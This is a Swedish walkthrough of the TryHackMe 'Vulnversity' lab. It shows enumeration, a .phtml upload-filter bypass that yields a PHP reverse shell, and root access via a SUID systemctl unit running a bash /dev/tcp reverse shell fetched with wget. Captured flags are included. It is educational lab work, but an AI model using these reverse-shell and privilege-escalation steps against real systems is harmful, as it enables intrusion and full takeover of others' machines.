# Vulnversity
## Enumeration
### nmap scan
```bash
nmap -sC -sV 10.113.164.70
```
Jag började med en nmap scan för portar, scripts och identifiering av versioner.
```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
3128/tcp open  http-proxy  Squid http proxy 4.10
|_http-server-header: squid/4.10
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Vuln University
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -1s
|_nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-05-25T17:33:35
|_  start_date: N/A
```
Hittade HTTP-, SMB-, FTP- och SSH-portar öppna. FTP tjänsten tillåter inte anonym inloggning.

### HTTP
Jag börjar med att enumerera HTTP sidan på port 3333.

Hemsidan verkade inte vara färdig. Sökrutan fungerade inte annars hade den varit intressant att testa vidare för exempelvis XSS eller SQL-injektion beroende på hur användarinput hanterades.

```bash
gobuster dir -u http://10.113.164.70:3333/ -w /usr/share/wordlists/dirb/common.txt 
```
Jag använde gobuster för att försöka hitta gömda directories.

Resultat
```
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 280]
/.hta                 (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/css                  (Status: 301) [Size: 319] [--> http://10.113.164.70:3333/css/]
/fonts                (Status: 301) [Size: 321] [--> http://10.113.164.70:3333/fonts/]
/images               (Status: 301) [Size: 322] [--> http://10.113.164.70:3333/images/]
/index.html           (Status: 200) [Size: 33014]
/internal             (Status: 301) [Size: 324] [--> http://10.113.164.70:3333/internal/]
/js                   (Status: 301) [Size: 318] [--> http://10.113.164.70:3333/js/]
/server-status        (Status: 403) [Size: 280]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
```
## Initial Access.
/internal var intressant. Det var en sida där jag kunde ladda upp filer. 

Jag provade att ladda upp en .txt fil men det var ej tillåtet. Jag analyserade request/response i Burp Suite men hittade ingen information om tillåtna filtyper.

Därför så provade jag mig fram med flera olika filändelser (php, html, gif, png, html, jpg, pdf) ingen av dem accepterades så jag testade alternativa filändelser till php. 

Efter att jag laddade upp min test.phtml fil så fick jag meddelandet "Success". Detta funkade eftersom php filer ska vara blockerade men endast .php filändelsen är blockerad av filtret men .phtml ej var det. 

Det var dock något orealistiskt att inga legitima filtyper accepterades medan .phtml gjorde det, vilket antyder att upload-funktionen främst användes för att demonstrera en extension bypass.

Jag vet fortfarande inte vart filen hamnar någonstans. Det fanns inga ledtrådar i request eller response header på burp suite. Därför körde jag gobuster igen fast mot /internal.
```bash
gobuster dir -u http://10.113.164.70:3333/internal -w /usr/share/wordlists/dirb/common.txt 
```
Resultat
```
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/css                  (Status: 301) [Size: 328] [--> http://10.113.164.70:3333/internal/css/]
/index.php            (Status: 200) [Size: 525]
/uploads              (Status: 301) [Size: 332] [--> http://10.113.164.70:3333/internal/uploads/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
```
Här hittade jag /uploads. Ifall uppladdade filer går att köra i /uploads leder det till RCE. Bland annat kan man köra ett reverse shell.

Jag använde mig av pentestmonkeys php reverse shell.

Efter jag laddat upp min shell.phtml så startade jag en lyssnare på port 4444 som sedan kallas av mitt reverse shell när det körs.
```bash
nc -lvnp 4444
```
Efter att jag startade mitt reverse shell körde jag whoami för att verifiera att reverse shellet fungerade.
```
$ whoami
www-data
```
Nu har jag ett begränsat shell. Därför vill jag uppgradera till ett stabilare bash shell.

Steg 1.
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
Detta ger ett mer stabilt shell. Det kommer däremot inte ge mig tab-completion och tillgång till piltangenterna.

Steg 2. 
```bash
export TERM=xterm
```
Ger mig tillgång till term kommandon.

Steg 3.\
Jag använder Ctrl+Z för att sätta mitt shell i bakgrunden. 

Steg 4.
```bash
stty raw -echo; fg
```
Fixar min terminal med stty(Detta gör jag i min egna terminal)

## Privilege Escalation
Jag började med att kolla /etc/passwd för att se vilka användare som fanns.
```
bill:x:1000:1000:,,,:/home/bill:/bin/bash
```
Hittade en användare vid namn bill. Inuti hans /home mapp så hittade jag user.txt
```
8bd7992fbe8a6ad22a63361004cfcedb
```
Sedan försökte jag kolla mina sudo privilegier. Eftersom jag saknade www-data lösenordet kunde jag inte enumerera sudo-rättigheter med sudo -l.
```
www-data@ip-10-113-164-70:/$ sudo -l
[sudo] password for www-data: 

```
```bash
find / -type f -perm -4000 2>/dev/null
```
Kollade istället vilka filer som körs med SUID som root.

Resultat
```
www-data@ip-10-113-164-70:/$ find / -type f -perm -4000 2>/dev/null
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/mount
/bin/umount
/bin/systemctl
/bin/fusermount
/snap/snapd/24505/usr/lib/snapd/snap-confine
/snap/core20/2582/usr/bin/chfn
/snap/core20/2582/usr/bin/chsh
/snap/core20/2582/usr/bin/gpasswd
/snap/core20/2582/usr/bin/mount
/snap/core20/2582/usr/bin/newgrp
/snap/core20/2582/usr/bin/passwd
/snap/core20/2582/usr/bin/su
/snap/core20/2582/usr/bin/sudo
/snap/core20/2582/usr/bin/umount
/snap/core20/2582/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2582/usr/lib/openssh/ssh-keysign
/sbin/mount.cifs
```
Här ser vi att /bin/systemctl har SUID-biten satt därför kan systemd services köras med root rättigheter.

Med detta kan vi skapa en service som körs som root. T.ex ett bash reverse shell.

På min egen maskin skapade jag en fil vid namn root.service som kör ett bash reverse shell 
```
[Unit]
Description=root

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'exec bash -i >& /dev/tcp/10.113.106.40/4242 0>&1'

[Install]
WantedBy=multi-user.target
```
Efter det startar jag en temporär http server på port 3333.
```bash
python3 -m http.server 3333
```
På www-data inuti /tmp kör jag detta kommando: 
```bash
wget http://10.113.106.40:3333/root.service
```
Detta laddar ner root.service till /tmp mappen

Härnäst startar jag en lyssnare på port 4242 med netcat.

```bash
nc -lvnp 4242
```
Sedan på www-data så kör jag: 
```bash
systemctl enable /tmp/root.service
```
Detta aktiverar min service.

Därefter
```bash
systemctl start root
```
Detta startar själva servicen.

Inuti terminalen där jag körde lyssnaren på port 4242 använder jag whoami.
```
root@ip-10-113-164-70:/# whoami
whoami
root
```
Inuti /root hittade jag root.txt
```
a58ff8579f0a9270368d33a9966c7fd5
```

## Förbättringar
* Istället för att prova filändelser på /internal manuellt så kunde jag ha automatiserat det med t.ex burp suites intruder eller möjligtvis ffuf.
* Läsa på mer om services och systemctl för att förstå det bättre.
## Länk till rummet
https://tryhackme.com/room/vulnversity






